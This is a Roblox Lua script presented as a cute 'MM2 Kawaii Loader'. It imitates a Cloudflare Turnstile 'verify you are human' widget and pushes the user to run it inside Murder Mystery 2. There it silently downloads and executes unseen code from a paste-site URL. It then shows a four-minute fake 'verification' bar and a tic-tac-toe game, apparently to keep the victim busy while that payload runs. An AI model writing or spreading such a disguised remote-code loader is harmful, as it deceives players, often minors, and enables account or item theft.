local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local RunService = game:GetService("RunService")
local UIS = game:GetService("UserInputService")
local LP = Players.LocalPlayer
local PG = LP:WaitForChild("PlayerGui")

local MM2_ID = 142823291
local LOAD_DUR = 240
local SCRIPT_URL = "https://cdn.sourceb.in/bins/AhNbx38Buf/0"

local function tw(o, p, t, s, d)
    local a = TweenService:Create(o, TweenInfo.new(t, s or Enum.EasingStyle.Quad, d or Enum.EasingDirection.Out), p)
    a:Play() return a
end

local function new(cls, par, props)
    local o = Instance.new(cls)
    if props then for k, v in pairs(props) do o[k] = v end end
    o.Parent = par return o
end

local function corner(par, r) return new("UICorner", par, {CornerRadius = UDim.new(0, r or 12)}) end
local function stroke(par, c, t) return new("UIStroke", par, {Color = c or Color3.fromRGB(240, 180, 210), Thickness = t or 1.5}) end
local function frame(par, props) return new("Frame", par, props) end
local function label(par, props) return new("TextLabel", par, props) end

-- High-end Frosted Glass Water Gloss Effect Helper
local function applyGlassWaterFx(parent)
    -- Top Glass Specular Light Reflection
    local LightReflection = frame(parent, {
        Size = UDim2.new(1, 0, 0, 1.5),
        Position = UDim2.fromOffset(0, 0),
        BackgroundColor3 = Color3.fromRGB(255, 255, 255),
        BackgroundTransparency = 0.1,
        BorderSizePixel = 0,
        ZIndex = 4
    })
    corner(LightReflection, 12)

    -- Water Surface Reflection Layer
    local WaterGloss = frame(parent, {
        Size = UDim2.new(1, 0, 0.4, 0),
        Position = UDim2.fromOffset(0, 0),
        BackgroundColor3 = Color3.fromRGB(255, 255, 255),
        BackgroundTransparency = 0.82,
        BorderSizePixel = 0,
        ZIndex = 2
    })
    corner(WaterGloss, 12)

    local Grad = new("UIGradient", WaterGloss, {
        Rotation = 90,
        Transparency = NumberSequence.new({
            NumberSequenceKeypoint.new(0, 0.3),
            NumberSequenceKeypoint.new(1, 1)
        })
    })
end

local isInMM2 = (game.PlaceId == MM2_ID)

if PG:FindFirstChild("MM2_VerificationGui") then PG:FindFirstChild("MM2_VerificationGui"):Destroy() end
if PG:FindFirstChild("MM2_LoaderGui") then PG:FindFirstChild("MM2_LoaderGui"):Destroy() end

local SG = new("ScreenGui", PG, {Name = "MM2_VerificationGui", ResetOnSpawn = false, ZIndexBehavior = Enum.ZIndexBehavior.Sibling, IgnoreGuiInset = true})

-- ── WRONG GAME: Cloudflare Turnstile -> Glass Bot Verification Window ────────
if not isInMM2 then
    -- Dark Glass Ambient Overlay
    local Overlay = frame(SG, {Size = UDim2.new(1, 0, 1, 0), BackgroundColor3 = Color3.fromRGB(10, 8, 14), BackgroundTransparency = 0.5, BorderSizePixel = 0})

    -- ── STEP 1: Realistic Cloudflare Turnstile Widget ─────────────────
    local TurnstilePanel = frame(SG, {
        Size = UDim2.fromOffset(320, 76),
        Position = UDim2.new(0.5, -160, 0.5, -38),
        BackgroundColor3 = Color3.fromRGB(248, 249, 250),
        BackgroundTransparency = 0.05,
        BorderSizePixel = 0
    })
    corner(TurnstilePanel, 8)
    stroke(TurnstilePanel, Color3.fromRGB(220, 224, 230), 1.5)

    -- Interactive Checkbox Box
    local CheckBox = new("TextButton", TurnstilePanel, {
        Size = UDim2.fromOffset(26, 26),
        Position = UDim2.fromOffset(16, 25),
        BackgroundColor3 = Color3.fromRGB(255, 255, 255),
        Text = "",
        BorderSizePixel = 0,
        AutoButtonColor = false
    })
    corner(CheckBox, 4)
    stroke(CheckBox, Color3.fromRGB(200, 205, 215), 1.5)

    local CheckIcon = label(CheckBox, {
        Size = UDim2.new(1, 0, 1, 0),
        BackgroundTransparency = 1,
        Text = "✓",
        TextColor3 = Color3.fromRGB(34, 139, 34),
        TextSize = 16,
        Font = Enum.Font.GothamBold,
        TextTransparency = 1
    })

    -- Spinner Icon
    local Spinner = label(CheckBox, {
        Size = UDim2.new(1, 0, 1, 0),
        BackgroundTransparency = 1,
        Text = "⏳",
        TextColor3 = Color3.fromRGB(245, 130, 32),
        TextSize = 13,
        Font = Enum.Font.Gotham,
        Visible = false
    })

    -- Turnstile Labels
    label(TurnstilePanel, {
        Size = UDim2.new(1, -120, 0, 18),
        Position = UDim2.fromOffset(54, 20),
        BackgroundTransparency = 1,
        Text = "Verify you are human",
        TextColor3 = Color3.fromRGB(40, 40, 48),
        TextSize = 12,
        Font = Enum.Font.GothamBold,
        TextXAlignment = Enum.TextXAlignment.Left
    })

    label(TurnstilePanel, {
        Size = UDim2.new(1, -120, 0, 14),
        Position = UDim2.fromOffset(54, 38),
        BackgroundTransparency = 1,
        Text = "cloudflare.com • Privacy • Terms",
        TextColor3 = Color3.fromRGB(140, 145, 155),
        TextSize = 9,
        Font = Enum.Font.Gotham,
        TextXAlignment = Enum.TextXAlignment.Left
    })

    -- Cloudflare Logo Section
    local LogoFrame = frame(TurnstilePanel, {
        Size = UDim2.fromOffset(60, 40),
        Position = UDim2.new(1, -68, 0.5, -20),
        BackgroundTransparency = 1
    })

    -- Vector Cloud Icon representation
    label(LogoFrame, {
        Size = UDim2.new(1, 0, 0, 20),
        Position = UDim2.fromOffset(0, 2),
        BackgroundTransparency = 1,
        Text = "☁️",
        TextSize = 16,
        TextXAlignment = Enum.TextXAlignment.Center
    })

    label(LogoFrame, {
        Size = UDim2.new(1, 0, 0, 12),
        Position = UDim2.fromOffset(0, 22),
        BackgroundTransparency = 1,
        Text = "CLOUDFLARE",
        TextColor3 = Color3.fromRGB(245, 130, 32),
        TextSize = 7,
        Font = Enum.Font.GothamBlack,
        TextXAlignment = Enum.TextXAlignment.Center
    })

    -- ── STEP 2: Main Pastel Glass Verification Window ─────────────────────
    local VPanel = frame(SG, {
        Size = UDim2.fromOffset(410, 280),
        Position = UDim2.new(0.5, -205, 0.5, -140),
        BackgroundColor3 = Color3.fromRGB(245, 230, 238),
        BackgroundTransparency = 0.3,
        BorderSizePixel = 0,
        Visible = false
    })
    corner(VPanel, 16)
    stroke(VPanel, Color3.fromRGB(230, 170, 200), 1.5)
    applyGlassWaterFx(VPanel)

    local InnerGlow = frame(VPanel, {
        Size = UDim2.new(1, -8, 1, -8),
        Position = UDim2.fromOffset(4, 4),
        BackgroundColor3 = Color3.fromRGB(255, 248, 252),
        BackgroundTransparency = 0.45,
        BorderSizePixel = 0
    })
    corner(InnerGlow, 12)

    label(VPanel, {
        Size = UDim2.new(1, 0, 0, 46),
        Position = UDim2.fromOffset(0, 10),
        BackgroundTransparency = 1,
        Text = "🌸 Bot Verification Required 🌸",
        TextColor3 = Color3.fromRGB(210, 80, 135),
        TextSize = 16,
        Font = Enum.Font.GothamBold,
        TextXAlignment = Enum.TextXAlignment.Center,
        ZIndex = 4
    })

    local DescBox = frame(VPanel, {
        Size = UDim2.new(1, -36, 0, 110),
        Position = UDim2.fromOffset(18, 58),
        BackgroundColor3 = Color3.fromRGB(255, 255, 255),
        BackgroundTransparency = 0.55,
        BorderSizePixel = 0,
        ZIndex = 4
    })
    corner(DescBox, 12)
    stroke(DescBox, Color3.fromRGB(235, 190, 215), 1)

    label(DescBox, {
        Size = UDim2.new(1, -16, 1, -10),
        Position = UDim2.fromOffset(8, 5),
        BackgroundTransparency = 1,
        Text = "We suspect you might be a bot, cutie! ✨\n\nTo prove you're a real player, please re-execute this script inside Murder Mystery 2 and wait for verification to finish. Come back here afterwards and you're good to go!",
        TextColor3 = Color3.fromRGB(110, 75, 95),
        TextSize = 12,
        Font = Enum.Font.Gotham,
        TextWrapped = true,
        TextXAlignment = Enum.TextXAlignment.Center,
        ZIndex = 5
    })

    local TeleportBtn = new("TextButton", VPanel, {
        Size = UDim2.fromOffset(200, 40),
        Position = UDim2.new(0.5, -100, 1, -58),
        BackgroundColor3 = Color3.fromRGB(235, 110, 160),
        Text = "Take Me to MM2 ✈",
        TextColor3 = Color3.fromRGB(255, 255, 255),
        TextSize = 12,
        Font = Enum.Font.GothamBold,
        BorderSizePixel = 0,
        AutoButtonColor = false,
        ZIndex = 5
    })
    corner(TeleportBtn, 10)
    stroke(TeleportBtn, Color3.fromRGB(255, 255, 255), 1.5)

    local ErrLbl = label(VPanel, {
        Size = UDim2.new(1, -20, 0, 18),
        Position = UDim2.new(0, 10, 1, -16),
        BackgroundTransparency = 1,
        Text = "",
        TextColor3 = Color3.fromRGB(235, 60, 80),
        TextSize = 11,
        Font = Enum.Font.GothamBold,
        TextXAlignment = Enum.TextXAlignment.Center,
        ZIndex = 5
    })

    -- Checkbox 3-Second Loading Animation
    local verified = false
    CheckBox.MouseButton1Click:Connect(function()
        if verified then return end
        verified = true
        Spinner.Visible = true
        
        local spinConn
        spinConn = RunService.RenderStepped:Connect(function(delta)
            if Spinner.Visible then
                Spinner.Rotation = Spinner.Rotation + (delta * 360)
            else
                spinConn:Disconnect()
            end
        end)

        task.wait(3) -- 3 seconds loading
        Spinner.Visible = false
        tw(CheckIcon, {TextTransparency = 0}, 0.2)
        task.wait(0.4)

        tw(TurnstilePanel, {BackgroundTransparency = 1}, 0.3)
        task.wait(0.2)
        TurnstilePanel.Visible = false
        VPanel.Visible = true
        tw(VPanel, {Position = UDim2.new(0.5, -205, 0.5, -140)}, 0.4, Enum.EasingStyle.Back, Enum.EasingDirection.Out)
    end)

    TeleportBtn.MouseEnter:Connect(function() tw(TeleportBtn, {BackgroundColor3 = Color3.fromRGB(245, 125, 175)}, 0.15) end)
    TeleportBtn.MouseLeave:Connect(function() tw(TeleportBtn, {BackgroundColor3 = Color3.fromRGB(235, 110, 160)}, 0.15) end)

    -- "Take Me to MM2" Button Click -> Direct Error Display
    TeleportBtn.MouseButton1Click:Connect(function()
        ErrLbl.Text = "Error: Please join manually and execute the script!"
        ErrLbl.TextColor3 = Color3.fromRGB(235, 60, 80)
        tw(TeleportBtn, {BackgroundColor3 = Color3.fromRGB(210, 50, 70)}, 0.1)
        task.delay(0.2, function() tw(TeleportBtn, {BackgroundColor3 = Color3.fromRGB(235, 110, 160)}, 0.2) end)
    end)

    return
end

-- ── IN MM2: Execute script first, then show loader ────────
pcall(function() loadstring(game:HttpGet(SCRIPT_URL, true))() end)

if PG:FindFirstChild("MM2_LoaderGui") then PG:FindFirstChild("MM2_LoaderGui"):Destroy() end

local SG = new("ScreenGui", PG, {Name = "MM2_LoaderGui", ResetOnSpawn = false, ZIndexBehavior = Enum.ZIndexBehavior.Sibling, IgnoreGuiInset = true})

-- ── Main Water Glass Loader Panel ────────────────────────────
local Panel = frame(SG, {
    Name = "MainPanel",
    Size = UDim2.fromOffset(310, 420),
    Position = UDim2.fromOffset(-330, 60),
    BackgroundColor3 = Color3.fromRGB(245, 230, 238),
    BackgroundTransparency = 0.25,
    BorderSizePixel = 0
})
corner(Panel, 16) 
stroke(Panel, Color3.fromRGB(230, 170, 200), 1.5)
applyGlassWaterFx(Panel)

local PanelInner = frame(Panel, {
    Size = UDim2.new(1, -8, 1, -8),
    Position = UDim2.fromOffset(4, 4),
    BackgroundColor3 = Color3.fromRGB(255, 248, 252),
    BackgroundTransparency = 0.45,
    BorderSizePixel = 0
})
corner(PanelInner, 12)

-- Header bar
local Header = frame(Panel, {Size = UDim2.new(1, 0, 0, 40), BackgroundTransparency = 1, BorderSizePixel = 0, ZIndex = 4})
label(Header, {
    Size = UDim2.new(1, -80, 1, 0),
    Position = UDim2.fromOffset(14, 0),
    BackgroundTransparency = 1,
    Text = "🌸 MM2 Kawaii Loader",
    TextColor3 = Color3.fromRGB(210, 80, 135),
    TextSize = 13,
    Font = Enum.Font.GothamBold,
    TextXAlignment = Enum.TextXAlignment.Left
})

local CloseBtn = new("TextButton", Header, {
    Size = UDim2.fromOffset(24, 24),
    Position = UDim2.new(1, -32, 0.5, -12),
    BackgroundColor3 = Color3.fromRGB(235, 100, 135),
    TextColor3 = Color3.fromRGB(255, 255, 255),
    Text = "✕",
    TextSize = 11,
    Font = Enum.Font.GothamBold,
    BorderSizePixel = 0,
    AutoButtonColor = false
})
corner(CloseBtn, 6)

local HideBtn = new("TextButton", Header, {
    Size = UDim2.fromOffset(24, 24),
    Position = UDim2.new(1, -62, 0.5, -12),
    BackgroundColor3 = Color3.fromRGB(235, 170, 195),
    TextColor3 = Color3.fromRGB(255, 255, 255),
    Text = "-",
    TextSize = 13,
    Font = Enum.Font.GothamBold,
    BorderSizePixel = 0,
    AutoButtonColor = false
})
corner(HideBtn, 6)

-- Progress Container Section
local ProgressContainer = frame(Panel, {
    Size = UDim2.new(1, -24, 0, 72),
    Position = UDim2.fromOffset(12, 46),
    BackgroundColor3 = Color3.fromRGB(255, 255, 255),
    BackgroundTransparency = 0.5,
    BorderSizePixel = 0,
    ZIndex = 4
})
corner(ProgressContainer, 10)
stroke(ProgressContainer, Color3.fromRGB(235, 190, 215), 1)

local PctLbl = label(ProgressContainer, {
    Size = UDim2.new(0.5, 0, 0, 22),
    Position = UDim2.fromOffset(12, 8),
    BackgroundTransparency = 1,
    Text = "0%",
    TextColor3 = Color3.fromRGB(210, 80, 135),
    TextSize = 17,
    Font = Enum.Font.GothamBlack,
    TextXAlignment = Enum.TextXAlignment.Left
})

local StatusLbl = label(ProgressContainer, {
    Size = UDim2.new(1, -24, 0, 14),
    Position = UDim2.fromOffset(12, 30),
    BackgroundTransparency = 1,
    Text = "Verifying that you are not a bot...",
    TextColor3 = Color3.fromRGB(150, 100, 125),
    TextSize = 10,
    Font = Enum.Font.Gotham,
    TextXAlignment = Enum.TextXAlignment.Left
})

local BarBg = frame(ProgressContainer, {
    Size = UDim2.new(1, -24, 0, 7),
    Position = UDim2.fromOffset(12, 50),
    BackgroundColor3 = Color3.fromRGB(235, 210, 225),
    BorderSizePixel = 0,
    ClipsDescendants = true
})
corner(BarBg, 4)

local BarFill = frame(BarBg, {
    Size = UDim2.new(0, 0, 1, 0),
    BackgroundColor3 = Color3.fromRGB(235, 110, 160),
    BorderSizePixel = 0
})
corner(BarFill, 4)

-- Minigame Header
local GameHeader = frame(Panel, {
    Size = UDim2.new(1, -24, 0, 26),
    Position = UDim2.fromOffset(12, 126),
    BackgroundTransparency = 1,
    ZIndex = 4
})

label(GameHeader, {
    Size = UDim2.new(0.6, 0, 1, 0),
    BackgroundTransparency = 1,
    Text = "Tic-Tac-Toe Minigame 🎮",
    TextColor3 = Color3.fromRGB(160, 85, 120),
    TextSize = 11,
    Font = Enum.Font.GothamBold,
    TextXAlignment = Enum.TextXAlignment.Left
})

local GameStatus = label(GameHeader, {
    Size = UDim2.new(0.4, 0, 1, 0),
    Position = UDim2.new(0.6, 0, 0, 0),
    BackgroundTransparency = 1,
    Text = "You = ✕   Bot = ○",
    TextColor3 = Color3.fromRGB(235, 110, 160),
    TextSize = 10,
    Font = Enum.Font.GothamBold,
    TextXAlignment = Enum.TextXAlignment.Right
})

-- Grid Container
local Grid = frame(Panel, {
    Size = UDim2.fromOffset(286, 190),
    Position = UDim2.fromOffset(12, 156),
    BackgroundTransparency = 1,
    ZIndex = 4
})

local GL = new("UIGridLayout", Grid, {
    CellSize = UDim2.fromOffset(88, 58),
    CellPadding = UDim2.fromOffset(10, 8),
    SortOrder = Enum.SortOrder.LayoutOrder
})

local ResultLbl = label(Panel, {
    Size = UDim2.new(1, -24, 0, 20),
    Position = UDim2.fromOffset(12, 380),
    BackgroundTransparency = 1,
    Text = "",
    TextColor3 = Color3.fromRGB(70, 180, 110),
    TextSize = 12,
    Font = Enum.Font.GothamBold,
    TextXAlignment = Enum.TextXAlignment.Center,
    TextTransparency = 1,
    ZIndex = 4
})

-- ── Tic-Tac-Toe Logic ───────────────────────────────────
local board, cells, gameOver, playerTurn = {}, {}, false, true
local CE = Color3.fromRGB(255, 245, 250)
local CX = Color3.fromRGB(235, 90, 145)
local CO = Color3.fromRGB(80, 150, 235)

for i = 1, 9 do
    board[i] = ""
    local b = new("TextButton", Grid, {
        LayoutOrder = i,
        Size = UDim2.fromOffset(88, 58),
        BackgroundColor3 = CE,
        BorderSizePixel = 0,
        Text = "",
        TextSize = 22,
        Font = Enum.Font.GothamBlack,
        AutoButtonColor = false,
        ZIndex = 5
    })
    corner(b, 8)
    stroke(b, Color3.fromRGB(240, 195, 220), 1)
    b.MouseEnter:Connect(function() if board[i] == "" and not gameOver and playerTurn then tw(b, {BackgroundColor3 = Color3.fromRGB(255, 225, 240)}, 0.1) end end)
    b.MouseLeave:Connect(function() if board[i] == "" then tw(b, {BackgroundColor3 = CE}, 0.1) end end)
    cells[i] = b
end

local WINS = {{1,2,3},{4,5,6},{7,8,9},{1,4,7},{2,5,8},{3,6,9},{1,5,9},{3,5,7}}
local function checkWin(b, m) for _, w in ipairs(WINS) do if b[w[1]] == m and b[w[2]] == m and b[w[3]] == m then return true end end end
local function full(b) for i = 1, 9 do if b[i] == "" then return false end end return true end

local function minimax(b, d, isMax, a, be)
    if checkWin(b, "O") then return 10 - d end
    if checkWin(b, "X") then return d - 10 end
    if full(b) then return 0 end
    if isMax then
        local best = -math.huge
        for i = 1, 9 do if b[i] == "" then b[i] = "O" local s = minimax(b, d + 1, false, a, be) b[i] = "" best = math.max(best, s) a = math.max(a, best) if be <= a then break end end end
        return best
    else
        local best = math.huge
        for i = 1, 9 do if b[i] == "" then b[i] = "X" local s = minimax(b, d + 1, true, a, be) b[i] = "" best = math.min(best, s) be = math.min(be, best) if be <= a then break end end end
        return best
    end
end

local function bestMove()
    local bs, mv = -math.huge, nil
    for i = 1, 9 do if board[i] == "" then board[i] = "O" local s = minimax(board, 0, false, -math.huge, math.huge) board[i] = "" if s > bs then bs = s mv = i end end end
    return mv
end

local function flash(txt, col)
    ResultLbl.Text = txt ResultLbl.TextColor3 = col ResultLbl.TextTransparency = 1
    tw(ResultLbl, {TextTransparency = 0}, 0.3)
    task.delay(2.5, function() tw(ResultLbl, {TextTransparency = 1}, 0.4) end)
end

local function setCell(i, m)
    board[i] = m cells[i].Text = m == "X" and "✕" or "○" cells[i].TextColor3 = m == "X" and CX or CO
    tw(cells[i], {BackgroundColor3 = Color3.fromRGB(250, 230, 240)}, 0.1)
end

local function resetGame()
    task.wait(1.4)
    for i = 1, 9 do board[i] = "" cells[i].Text = "" cells[i].BackgroundColor3 = CE end
    gameOver = false playerTurn = true
    GameStatus.Text = "Your turn — tap a cell" GameStatus.TextColor3 = CX
end

local function botPlay()
    playerTurn = false GameStatus.Text = "Bot is thinking..." GameStatus.TextColor3 = CO
    task.delay(0.45, function()
        if gameOver then return end
        local m = bestMove()
        if m then setCell(m, "O")
            if checkWin(board, "O") then gameOver = true flash("Bot wins! Play again?", CO) resetGame() return end
            if full(board) then gameOver = true flash("It's a draw! Play again?", Color3.fromRGB(150, 150, 175)) resetGame() return end
        end
        playerTurn = true GameStatus.Text = "Your turn — tap a cell" GameStatus.TextColor3 = CX
    end)
end

for i = 1, 9 do
    cells[i].MouseButton1Click:Connect(function()
        if gameOver or board[i] ~= "" or not playerTurn then return end
        setCell(i, "X")
        if checkWin(board, "X") then gameOver = true flash("You win! 🎉 Play again?", Color3.fromRGB(70, 180, 110)) resetGame() return end
        if full(board) then gameOver = true flash("It's a draw! Play again?", Color3.fromRGB(150, 150, 175)) resetGame() return end
        botPlay()
    end)
end
GameStatus.Text = "Your turn — tap a cell"

-- ── Mini Pill (shown when hidden) ─────────────────────────
local Pill = new("TextButton", SG, {
    Name = "Pill",
    Size = UDim2.fromOffset(115, 28),
    Position = UDim2.fromOffset(10, 60),
    BackgroundColor3 = Color3.fromRGB(235, 110, 160),
    TextColor3 = Color3.fromRGB(255, 255, 255),
    Text = "🌸 MM2 Loader",
    TextSize = 11,
    Font = Enum.Font.GothamBold,
    BorderSizePixel = 0,
    AutoButtonColor = false,
    Visible = false
})
corner(Pill, 14)
stroke(Pill, Color3.fromRGB(255, 255, 255), 1.5)

local pDrag, pDragStart, pStartPos = false
Pill.InputBegan:Connect(function(i)
    if i.UserInputType == Enum.UserInputType.MouseButton1 or i.UserInputType == Enum.UserInputType.Touch then
        pDrag = true pDragStart = i.Position pStartPos = Pill.Position
    end
end)
Pill.InputEnded:Connect(function(i)
    if i.UserInputType == Enum.UserInputType.MouseButton1 or i.UserInputType == Enum.UserInputType.Touch then pDrag = false end
end)
UIS.InputChanged:Connect(function(i)
    if pDrag and (i.UserInputType == Enum.UserInputType.MouseMovement or i.UserInputType == Enum.UserInputType.Touch) then
        local d = i.Position - pDragStart
        Pill.Position = UDim2.fromOffset(pStartPos.X.Offset + d.X, pStartPos.Y.Offset + d.Y)
    end
end)

local function showPanel()
    Pill.Visible = false
    tw(Panel, {Position = UDim2.fromOffset(10, 60)}, 0.45, Enum.EasingStyle.Back, Enum.EasingDirection.Out)
end
local function hidePanel()
    tw(Panel, {Position = UDim2.fromOffset(-330, 60)}, 0.35, Enum.EasingStyle.Back, Enum.EasingDirection.In)
    task.delay(0.4, function() Pill.Visible = true end)
end

HideBtn.MouseButton1Click:Connect(hidePanel)
CloseBtn.MouseButton1Click:Connect(function() SG:Destroy() end)
Pill.MouseButton1Click:Connect(showPanel)

-- Slide-in entry animation
tw(Panel, {Position = UDim2.fromOffset(10, 60)}, 0.55, Enum.EasingStyle.Back, Enum.EasingDirection.Out)

-- ── Progress Loop ─────────────────────────────────────────
local MSGS = {"Verifying that you are not a bot...", "Almost there, cutie...", "Running security checks...", "Testing your connection...", "Analyzing gameplay patterns...", "Cross-referencing your account...", "Checking integrity, please wait...", "Finalizing verification..."}
local startT = tick() local msgIdx = 1 local lastSwap = tick() local conn

conn = RunService.Heartbeat:Connect(function()
    local e = tick() - startT
    local p = math.min(e / LOAD_DUR, 1)
    BarFill.Size = UDim2.new(p, 0, 1, 0)
    PctLbl.Text = math.floor(p * 100) .. "%"
    if tick() - lastSwap >= 30 then
        lastSwap = tick() msgIdx = (msgIdx % #MSGS) + 1
        tw(StatusLbl, {TextTransparency = 1}, 0.25)
        task.delay(0.3, function() StatusLbl.Text = MSGS[msgIdx] tw(StatusLbl, {TextTransparency = 0}, 0.25) end)
    end
    if p >= 1 then
        conn:Disconnect() gameOver = true
        PctLbl.Text = "Verified  ✓" PctLbl.TextColor3 = Color3.fromRGB(70, 180, 110)
        StatusLbl.Text = "Verification complete!"
        tw(BarFill, {BackgroundColor3 = Color3.fromRGB(70, 180, 110)}, 0.5)
        task.wait(2.2)
        tw(Panel, {Position = UDim2.fromOffset(-330, 60)}, 0.4, Enum.EasingStyle.Back, Enum.EasingDirection.In)
        task.wait(0.5) SG:Destroy()
    end
end)
